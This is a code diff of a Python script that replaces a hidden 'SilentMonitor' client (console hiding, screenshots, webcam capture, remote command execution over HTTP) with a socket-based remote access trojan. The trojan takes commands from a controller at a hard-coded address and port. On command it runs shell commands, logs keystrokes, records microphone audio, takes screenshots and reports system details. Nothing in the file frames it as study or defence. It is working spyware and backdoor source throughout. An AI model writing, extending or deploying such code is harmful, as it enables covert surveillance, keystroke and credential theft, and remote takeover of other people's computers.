@@ -1,182 +1,140 @@
-import sys
-import os
-import ctypes
-import subprocess
-import psutil
-import requests
-import time
-from PIL import ImageGrab
-import io
-import base64
+import sys, os, socket, time, base64, tabulate, platform, io, psutil, subprocess, threading, pyscreenshot
 from datetime import datetime
-import socket
-import threading
-import json
-from pathlib import Path
+try:
+    from pynput.keyboard import Listener
+    import sounddevice as sd
+    from scipy.io.wavfile import write
+    HAVE_LIBS = True
+except:
+    HAVE_LIBS = False
 
-if sys.platform == 'win32':
-    import win32gui
-    import win32con
-    import win32api
-    import win32process
-    from pynput import keyboard, mouse
-    
-    def hide_console():
-        try:
-            window = ctypes.windll.kernel32.GetConsoleWindow()
-            if window:
-                ctypes.windll.user32.ShowWindow(window, 0)
-        except:
-            pass
-    
-    hide_console()
+CONSTIP = "127.0.0.1"
+CONSTPT = 4000
 
-# Configuration
-SERVER_URL = "http://127.0.0.1:5000"
-API_KEY = "dev"
-SCREENSHOT_INTERVAL = 300
-HEARTBEAT_INTERVAL = 30
+class AUDIO:
+    def record(self, seconds):
+        fs = 44100
+        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        obj = io.BytesIO()
+        write(obj, fs, rec)
+        return obj.getvalue()
 
-class SilentMonitor:
+class SYSINFO:
     def __init__(self):
-        self.pc_id = socket.gethostname()
-        self.running = True
-        self.keylog_buffer = []
-        self.file_changes = []
-        self.monitored_folders = [
-            os.path.expanduser("~/Desktop"),
-            os.path.expanduser("~/Documents"),
-            os.path.expanduser("~/Downloads")
-        ]
-
-    def show_debug_msg(self):
-        """Temporary message box to confirm the script is running"""
-        # 0x40 is the code for an Information Icon + OK button
-        ctypes.windll.user32.MessageBoxW(0, "System Health Monitor is now active.", "Debug Status", 0x40)
-
-    def get_system_info(self):
-        return {
-            'pc_id': self.pc_id,
-            'cpu': psutil.cpu_percent(interval=1),
-            'ram': psutil.virtual_memory().percent,
-            'ram_used': f"{psutil.virtual_memory().used / (1024**3):.1f}GB",
-            'ram_total': f"{psutil.virtual_memory().total / (1024**3):.1f}GB",
-            'disk_used': f"{psutil.disk_usage('/').used / (1024**3):.1f}GB",
-            'disk_total': f"{psutil.disk_usage('/').total / (1024**3):.1f}GB",
-            'uptime': int(time.time() - psutil.boot_time()),
-            'active_window': self.get_active_window(),
-            'running_apps': self.get_running_apps(),
-            'network_connections': len(psutil.net_connections()),
-            'timestamp': datetime.now().isoformat()
-        }
-
-    def get_active_window(self):
-        try:
-            window = win32gui.GetForegroundWindow()
-            return win32gui.GetWindowText(window)
-        except:
-            return "Unknown"
-
-    def get_running_apps(self):
-        apps = []
-        for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_percent']):
+        self.sysinfo = self.get_sys_info()
+        self.boot_time = self.get_boot_time()
+        self.cpu_info = self.get_cpu_info()
+        self.mem_usage = self.get_mem_usage()
+        self.disk_info = self.get_disk_info()
+        self.net_info  = self.get_net_info()
+    def get_size(self, b, s="B"):
+        f = 1024
+        for u in ["", "K", "M", "G", "T", "P"]:
+            if b < f: return f"{b:.2f}{u}{s}"
+            b /= f
+    def get_sys_info(self):
+        un = platform.uname()
+        v = [("System", un.system), ("Node", un.node), ("Release", un.release), ("Version", un.version), ("Machine", un.machine), ("Processor", un.processor)]
+        return tabulate.tabulate(v, headers=("Platform Tag", "Information"))
+    def get_boot_time(self):
+        bt = datetime.fromtimestamp(psutil.boot_time())
+        return tabulate.tabulate([("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")], headers=("Boot Tags", "Information"))
+    def get_cpu_info(self):
+        cp = psutil.cpu_freq()
+        v = [("Physical Cores", psutil.cpu_count(logical=False)), ("Total Cores", psutil.cpu_count(logical=True)), ("Max Freq", f"{cp.max:.2f}Mhz"), ("CPU Usage", f"{psutil.cpu_percent()}%")]
+        return tabulate.tabulate(v, headers=("CPU Tag", "Value"))
+    def get_mem_usage(self):
+        sm, sw = psutil.virtual_memory(), psutil.swap_memory()
+        v = [("Total Mem", self.get_size(sm.total)), ("Available", self.get_size(sm.available)), ("Used", self.get_size(sm.used)), ("Total Swap", self.get_size(sw.total))]
+        return tabulate.tabulate(v, headers=("Memory Tag", "Value"))
+    def get_disk_info(self):
+        v = []
+        for p in psutil.disk_partitions():
             try:
-                if proc.info['cpu_percent'] > 0 or proc.info['memory_percent'] > 1:
-                    apps.append({
-                        'name': proc.info['name'],
-                        'cpu': proc.info['cpu_percent'],
-                        'memory': round(proc.info['memory_percent'], 2)
-                    })
-            except: pass
-        return sorted(apps, key=lambda x: x['cpu'], reverse=True)[:10]
+                u = psutil.disk_usage(p.mountpoint)
+                v.append([p.device, p.mountpoint, p.fstype, self.get_size(u.total), self.get_size(u.used), f"{u.percent}%"])
+            except: continue
+        return tabulate.tabulate(v, headers=("Device", "Mount", "FS", "Total", "Used", "PCNT"))
+    def get_net_info(self):
+        v = []
+        for n, ads in psutil.net_if_addrs().items():
+            for a in ads:
+                if str(a.family) == 'AddressFamily.AF_INET':
+                    v.append([n, a.address, a.netmask, a.broadcast])
+        return tabulate.tabulate(v, headers=('Interface', 'IP', 'Netmask', 'Broadcast'))
+    def get_data(self):
+        return f"\n{self.sysinfo}\n\n{self.boot_time}\n\n{self.cpu_info}\n\n{self.mem_usage}\n\n{self.disk_info}\n\n{self.net_info}\n"
 
-    def capture_screenshot(self):
-        try:
-            screenshot = ImageGrab.grab()
-            buffer = io.BytesIO()
-            screenshot.save(buffer, format='JPEG', quality=50)
-            return base64.b64encode(buffer.getvalue()).decode()
-        except: return None
+class SCREENSHOT:
+    def get_data(self):
+        obj = io.BytesIO()
+        im = pyscreenshot.grab()
+        im.save(obj, format="PNG")
+        return obj.getvalue()
 
-    def capture_webcam(self):
-        try:
-            import cv2
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            cap.release()
-            if ret:
-                _, buffer = cv2.imencode('.jpg', frame)
-                return base64.b64encode(buffer).decode()
-        except: pass
-        return None
-
-    def send_data(self, endpoint, data):
-        try:
-            data['pc_id'] = self.pc_id
-            data['timestamp'] = datetime.now().isoformat()
-            requests.post(
-                f"{SERVER_URL}{endpoint}",
-                json=data,
-                headers={'Authorization': f'Bearer {API_KEY}'},
-                timeout=10
-            )
-        except: pass
-
-    def heartbeat_loop(self):
-        while self.running:
+class CLIENT:
+    SOCK = None
+    KEY  = ")J@NcRfU"
+    def __init__(self, _ip, _pt):
+        self.ipaddress, self.port = _ip, _pt
+    def send_data(self, tosend, encode=True):
+        if encode: self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
+        else: self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
+    def run_keylogger(self, duration):
+        strokes = ""
+        def on_press(key):
+            nonlocal strokes
+            k = str(key).replace("'", "")
+            strokes += k if len(k) == 1 else f"[{k}]"
+        stop_event = threading.Event()
+        def timer():
+            time.sleep(duration)
+            stop_event.set()
+        threading.Thread(target=timer).start()
+        with Listener(on_press=on_press) as l:
+            while not stop_event.is_set():
+                if not l.running: break
+                time.sleep(0.1)
+            l.stop()
+        return strokes
+    def execute(self, command):
+        data = command.decode('utf-8').split(":")
+        if data[0] == "shell":
+            t = data[1].strip()
+            if t.startswith("cd "):
+                try: os.chdir(t[3:]); self.send_data("")
+                except: self.send_data("Error")
+            else:
+                try:
+                    c = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                    o, e = c.communicate()
+                    self.send_data(o + e)
+                except: self.send_data("Error")
+        elif data[0] == "sysinfo": self.send_data(SYSINFO().get_data())
+        elif data[0] == "screenshot": self.send_data(SCREENSHOT().get_data(), False)
+        elif data[0] == "keylog":
+            try: self.send_data(self.run_keylogger(int(data[1])))
+            except: self.send_data("Keylog Error")
+        elif data[0] == "record":
+            try: self.send_data(AUDIO().record(int(data[1])), False)
+            except: self.send_data("Audio Error")
+    def engage(self):
+        while True:
             try:
-                data = self.get_system_info()
-                self.send_data('/heartbeat', data)
-            except: pass
-            time.sleep(HEARTBEAT_INTERVAL)
-
-    def check_commands(self):
-        while self.running:
-            try:
-                response = requests.get(
-                    f"{SERVER_URL}/commands/{self.pc_id}",
-                    headers={'Authorization': f'Bearer {API_KEY}'},
-                    timeout=10
-                )
-                if response.status_code == 200:
-                    commands = response.json()
-                    for cmd in commands:
-                        self.execute_command(cmd)
-            except: pass
-            time.sleep(30)
-
-    def execute_command(self, command):
-        cmd_type = command.get('type')
-        if cmd_type == 'screenshot':
-            img = self.capture_screenshot()
-            if img: self.send_data('/screenshot', {'image': img, 'on_demand': True})
-        elif cmd_type == 'webcam':
-            img = self.capture_webcam()
-            if img: self.send_data('/webcam', {'image': img})
-        elif cmd_type == 'execute':
-            try:
-                result = subprocess.run(command['cmd'], shell=True, capture_output=True, text=True, timeout=30, creationflags=0x08000000)
-                self.send_data('/command_result', {'output': result.stdout, 'error': result.stderr})
-            except: pass
-
-    def run(self):
-        """Main execution"""
-        # 1. Show the debug message first (remove this line later)
-        self.show_debug_msg()
-        
-        # 2. Wait for system to stabilize
-        time.sleep(5) 
-        
-        # 3. Send startup notification
-        self.send_data('/event', {'event': 'startup'})
-        
-        # 4. Start background threads
-        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
-        threading.Thread(target=self.check_commands, daemon=True).start()
-        
-        while self.running:
-            time.sleep(60)
+                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.SOCK.connect((self.ipaddress, self.port))
+                while True:
+                    f = b""
+                    while True:
+                        c = self.SOCK.recv(4096)
+                        if not c: break
+                        f += c
+                        if self.KEY.encode() in c:
+                            cmd = base64.decodebytes(f.rstrip(self.KEY.encode()))
+                            threading.Thread(target=self.execute, args=(cmd,), daemon=True).start()
+                            f = b""
+            except: time.sleep(10)
 
 if __name__ == "__main__":
-    monitor = SilentMonitor()
-    monitor.run()
+    CLIENT(CONSTIP, CONSTPT).engage()
